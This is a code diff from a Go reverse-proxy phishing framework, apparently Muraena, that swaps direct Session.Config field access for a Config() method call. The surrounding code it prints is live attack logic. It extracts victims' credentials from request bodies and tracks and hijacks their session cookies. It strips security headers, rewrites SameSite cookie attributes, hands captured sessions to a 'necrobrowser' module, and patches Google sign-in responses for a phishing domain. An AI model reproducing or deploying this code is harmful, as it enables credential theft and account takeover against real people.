@@ -97,7 +97,7 @@ func (muraena *MuraenaProxy) RequestBodyProcessor(request *http.Request, track *
 		bodyString := string(buf)
 
 		// Trace credentials
-		if muraena.Session.Config.Tracking.Enabled && track.IsValid() {
+		if muraena.Session.Config().Tracking.Enabled && track.IsValid() {
 			found, err := track.ExtractCredentials(bodyString, request)
 			if err != nil {
 				return errors.New(fmt.Sprintf("ExtractCredentials error: %s", err))
@@ -120,8 +120,8 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 
 	sess := muraena.Session
 	base64 := Base64{
-		sess.Config.Transform.Base64.Enabled,
-		sess.Config.Transform.Base64.Padding,
+		sess.Config().Transform.Base64.Enabled,
+		sess.Config().Transform.Base64.Padding,
 	}
 
 	// Replacer object
@@ -132,15 +132,15 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 	track := muraena.Tracker.TrackRequest(request)
 
 	// If specified in the configuration, set the User-Agent header
-	if sess.Config.Transform.Request.UserAgent != "" {
-		request.Header.Set("User-Agent", sess.Config.Transform.Request.UserAgent)
+	if sess.Config().Transform.Request.UserAgent != "" {
+		request.Header.Set("User-Agent", sess.Config().Transform.Request.UserAgent)
 	}
 
 	//
 	// BODY
 	//
 	// Transform body
-	if len(sess.Config.Transform.Request.CustomContent) > 0 {
+	if len(sess.Config().Transform.Request.CustomContent) > 0 {
 
 		// Make sure the content type is not binary
 
@@ -169,7 +169,7 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 			}
 
 			bodyString := string(buf)
-			for _, cc := range sess.Config.Transform.Request.CustomContent {
+			for _, cc := range sess.Config().Transform.Request.CustomContent {
 				bodyString = strings.Replace(bodyString, cc[0], cc[1], -1)
 			}
 
@@ -208,7 +208,7 @@ skip:
 	// Transform HTTP headers of interest
 	request.Host = muraena.Target.Host
 
-	for _, header := range sess.Config.Transform.Request.Headers {
+	for _, header := range sess.Config().Transform.Request.Headers {
 		if request.Header.Get(header) != "" {
 			hVal := request.Header.Get(header)
 			hURL, err := replacer.transformUrl(hVal, base64)
@@ -225,7 +225,7 @@ skip:
 	}
 
 	// Track request cookies (if enabled)
-	if muraena.Session.Config.Tracking.TrackRequestCookies && track.IsValid() {
+	if muraena.Session.Config().Tracking.TrackRequestCookies && track.IsValid() {
 		if len(request.Cookies()) > 0 {
 			// get victim:
 			victim, err := muraena.Tracker.GetVictim(track)
@@ -267,20 +267,20 @@ skip:
 	}
 
 	// Add extra HTTP headers
-	for _, header := range sess.Config.Transform.Request.Add.Headers {
+	for _, header := range sess.Config().Transform.Request.Add.Headers {
 		request.Header.Set(header.Name, header.Value)
 	}
 
 	// Log line
 	lhead := fmt.Sprintf("[%s]", GetSenderIP(request))
-	if sess.Config.Tracking.Enabled {
+	if sess.Config().Tracking.Enabled {
 		lhead = fmt.Sprintf("[%*s]%s", track.TrackerLength, track.ID, lhead)
 	}
 
 	l := fmt.Sprintf("%s [%s][%s%s%s]",
 		lhead,
 		Magenta(request.Method),
-		Magenta(sess.Config.Proxy.Protocol), Yellow(request.Host), Cyan(request.URL.Path))
+		Magenta(sess.Config().Proxy.Protocol), Yellow(request.Host), Cyan(request.URL.Path))
 
 	if track.IsValid() {
 		log.Debug(l)
@@ -289,7 +289,7 @@ skip:
 	}
 
 	// Remove headers
-	for _, header := range sess.Config.Transform.Request.Remove.Headers {
+	for _, header := range sess.Config().Transform.Request.Remove.Headers {
 		request.Header.Del(header)
 	}
 
@@ -298,13 +298,13 @@ skip:
 	//
 
 	// If the requested resource extension is no relevant, skip body processing.
-	for _, extension := range sess.Config.Transform.Request.SkipExtensions {
+	for _, extension := range sess.Config().Transform.Request.SkipExtensions {
 		if strings.HasSuffix(request.URL.Path, fmt.Sprintf(".%s", extension)) {
 			return
 		}
 	}
 
-	if muraena.Session.Config.Tracking.Enabled && track.IsValid() {
+	if muraena.Session.Config().Tracking.Enabled && track.IsValid() {
 		log.Verbose("Hijacking session: %s at %s", track.ID, request.URL.Path)
 		err = track.HijackSession(request)
 		if err != nil {
@@ -358,8 +358,8 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 
 	sess := muraena.Session
 	base64 := Base64{
-		sess.Config.Transform.Base64.Enabled,
-		sess.Config.Transform.Base64.Padding,
+		sess.Config().Transform.Base64.Enabled,
+		sess.Config().Transform.Base64.Padding,
 	}
 
 	if response.Request.Header.Get(muraena.Tracker.LandingHeader) != "" {
@@ -367,8 +367,8 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 		response.Header.Add(muraena.Tracker.Header, response.Request.Header.Get(muraena.Tracker.Header))
 		response.Header.Add("Set-Cookie",
 			fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
-				muraena.Session.Config.Tracking.Trace.Identifier, response.Request.Header.Get(muraena.Tracker.Header),
-				muraena.Session.Config.Proxy.Phishing))
+				muraena.Session.Config().Tracking.Trace.Identifier, response.Request.Header.Get(muraena.Tracker.Header),
+				muraena.Session.Config().Proxy.Phishing))
 		response.Header.Set("Location", response.Request.Header.Get(muraena.Tracker.LandingHeader))
 		return
 	}
@@ -377,7 +377,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	replacer := muraena.Replacer
 
 	// Add extra HTTP headers
-	for _, header := range sess.Config.Transform.Response.Add.Headers {
+	for _, header := range sess.Config().Transform.Response.Add.Headers {
 		response.Header.Set(header.Name, header.Value)
 	}
 
@@ -385,12 +385,12 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	// HEADERS
 	//
 	// delete security headers
-	for _, header := range sess.Config.Transform.Response.Remove.Headers {
+	for _, header := range sess.Config().Transform.Response.Remove.Headers {
 		response.Header.Del(header)
 	}
 
 	// transform headers of interest
-	for _, header := range sess.Config.Transform.Response.Headers {
+	for _, header := range sess.Config().Transform.Response.Headers {
 		if response.Header.Get(header) != "" {
 			if header == "Set-Cookie" {
 				for k, value := range response.Header["Set-Cookie"] {
@@ -407,7 +407,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 					}
 
 					// Further, if the SameSite attribute is set in the configuration, we need to patch the cookie
-					if sess.Config.Transform.Response.Cookie.SameSite != "" {
+					if sess.Config().Transform.Response.Cookie.SameSite != "" {
 						cookie := response.Header["Set-Cookie"][k]
 
 						// if cookie contains SameSite (case insensitive)
@@ -418,9 +418,9 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 						}
 
 						if samesite != "" {
-							cookie = strings.Replace(cookie, samesite, sess.Config.Transform.Response.Cookie.SameSite, 1)
+							cookie = strings.Replace(cookie, samesite, sess.Config().Transform.Response.Cookie.SameSite, 1)
 						} else {
-							cookie = cookie + ";SameSite=" + sess.Config.Transform.Response.Cookie.SameSite
+							cookie = cookie + ";SameSite=" + sess.Config().Transform.Response.Cookie.SameSite
 						}
 
 						response.Header["Set-Cookie"][k] = cookie
@@ -439,7 +439,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	// Media LandingType handling.
 	// Prevent processing of unwanted media types
 	mediaType := strings.ToLower(response.Header.Get("Content-Type"))
-	for _, skip := range sess.Config.Transform.Response.SkipContentType {
+	for _, skip := range sess.Config().Transform.Response.SkipContentType {
 		skip = strings.ToLower(skip)
 
 		if mediaType == skip {
@@ -455,7 +455,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	//
 	// Trace
 	//
-	if muraena.Session.Config.Tracking.Enabled {
+	if muraena.Session.Config().Tracking.Enabled {
 		trace := muraena.Tracker.TrackResponse(response)
 		if trace.IsValid() {
 
@@ -496,7 +496,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 					// muraena.Tracker.ShowVictims()
 				}
 
-				if muraena.Session.Config.Necrobrowser.Enabled {
+				if muraena.Session.Config().Necrobrowser.Enabled {
 					m, err := muraena.Session.Module("necrobrowser")
 					if err != nil {
 						log.Error("%s", err)
@@ -505,7 +505,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 						if ok {
 
 							getSession := false
-							for _, c := range muraena.Session.Config.Necrobrowser.SensitiveLocations.AuthSessionResponse {
+							for _, c := range muraena.Session.Config().Necrobrowser.SensitiveLocations.AuthSessionResponse {
 								if response.Request.URL.Path == c {
 									// log.Debug("Going to hijack response: %s (Victim: %+v)", response.Request.URL.Path, victim.ID)
 									getSession = true
@@ -557,7 +557,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 
 	// Ugly Google patch
 	if strings.Contains(response.Request.URL.Path, "AccountsSignInUi/data/batchexecute") {
-		if strings.Contains(newBody, muraena.Session.Config.Proxy.Phishing) {
+		if strings.Contains(newBody, muraena.Session.Config().Proxy.Phishing) {
 			if strings.HasPrefix(newBody, ")]}'\n\n") {
 				newBody = patchGoogleStructs(newBody)
 			}
@@ -646,7 +646,7 @@ func (init *MuraenaProxyInit) Spawn() *MuraenaProxy {
 
 func (muraena *MuraenaProxy) getHTTPRedirect(request *http.Request) *session.Redirect {
 
-	for _, drop := range muraena.Session.Config.Redirects {
+	for _, drop := range muraena.Session.Config().Redirects {
 		// Skip if Hostname is set and the request Hostname is different from the expected one
 		if drop.Hostname != "" && request.Host != drop.Hostname {
 			continue
@@ -678,7 +678,7 @@ func (muraena *MuraenaProxy) getHTTPRedirect(request *http.Request) *session.Red
 func (st SessionType) HandleFood(response http.ResponseWriter, request *http.Request) {
 	var destination string
 
-	if st.Session.Config.StaticServer.Enabled {
+	if st.Session.Config().StaticServer.Enabled {
 		m, err := st.Session.Module("static.http")
 		if err != nil {
 			log.Error("%s", err)
@@ -696,7 +696,7 @@ func (st SessionType) HandleFood(response http.ResponseWriter, request *http.Req
 		subs := strings.Split(request.Host, st.Replacer.Phishing)
 		if len(subs) > 1 {
 			sub := strings.Replace(subs[0], ".", "", -1)
-			for _, m := range st.Session.Config.Origins.SubdomainMap {
+			for _, m := range st.Session.Config().Origins.SubdomainMap {
 				if m[0] == sub {
 					request.Host = fmt.Sprintf("%s.%s", m[1], st.Replacer.Phishing)
 					break
@@ -713,7 +713,7 @@ func (st SessionType) HandleFood(response http.ResponseWriter, request *http.Req
 				// even if the resource is aa.bb.cc.dom.tld, the mapping is always one level as in www--2.phishing.tld.
 				// This is important since wildcard SSL certs do not handle N levels of nesting
 				if subMapping == strings.Split(request.Host, ".")[0] {
-					destination = fmt.Sprintf("%s%s", st.Session.Config.Proxy.Protocol,
+					destination = fmt.Sprintf("%s%s", st.Session.Config().Proxy.Protocol,
 						strings.Replace(request.Host,
 							fmt.Sprintf("%s.%s", subMapping, st.Replacer.Phishing),
 							domain, -1))
@@ -721,13 +721,13 @@ func (st SessionType) HandleFood(response http.ResponseWriter, request *http.Req
 				}
 			}
 		} else {
-			destination = fmt.Sprintf("%s%s", st.Session.Config.Proxy.Protocol,
+			destination = fmt.Sprintf("%s%s", st.Session.Config().Proxy.Protocol,
 				strings.Replace(request.Host, st.Replacer.Phishing, st.Replacer.Target, -1))
 		}
 	}
 
 	// PortMapping
-	if st.Session.Config.Proxy.PortMap != "" {
+	if st.Session.Config().Proxy.PortMap != "" {
 		destURL, err := url.Parse(destination)
 		if err != nil {
 			log.Error("%s", err)
@@ -741,8 +741,8 @@ func (st SessionType) HandleFood(response http.ResponseWriter, request *http.Req
 				destination = fmt.Sprintf("%s:%s", destination, port)
 			}
 
-			if strings.HasPrefix(st.Session.Config.Proxy.PortMap, fmt.Sprintf("%s:", port)) {
-				newport := strings.Split(st.Session.Config.Proxy.PortMap, ":")[1]
+			if strings.HasPrefix(st.Session.Config().Proxy.PortMap, fmt.Sprintf("%s:", port)) {
+				newport := strings.Split(st.Session.Config().Proxy.PortMap, ":")[1]
 				destination = strings.Replace(destination, fmt.Sprintf(":%s", port), fmt.Sprintf(":%s", newport), 1)
 			}
 		}
